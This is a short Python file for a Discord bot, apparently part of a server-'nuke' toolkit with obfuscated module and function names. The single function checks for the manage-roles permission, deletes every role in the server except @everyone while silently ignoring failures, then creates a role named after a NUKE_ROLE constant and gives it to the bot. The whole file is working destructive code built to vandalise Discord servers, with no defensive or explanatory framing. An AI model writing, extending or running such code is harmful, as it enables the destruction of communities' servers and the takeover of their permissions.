import discord
from core.g._78 import _78

async def _8(ctx):
    if not ctx.guild.me.guild_permissions.manage_roles:
        await ctx.send("BOT NEEDS MANAGE ROLES PERMISSION", delete_after=3)
        return
    await ctx.send("DELETING ALL ROLES", delete_after=2)
    for role in ctx.guild.roles:
        if role.name != "@everyone":
            try:
                await role.delete()
            except:
                pass
    new_role = await ctx.guild.create_role(name=_78.NUKE_ROLE, color=_78.NUKE_COLOR)
    await ctx.guild.me.add_roles(new_role)
    await ctx.send(f"CREATED ROLE {_78.NUKE_ROLE} AND ASSIGNED TO BOT")
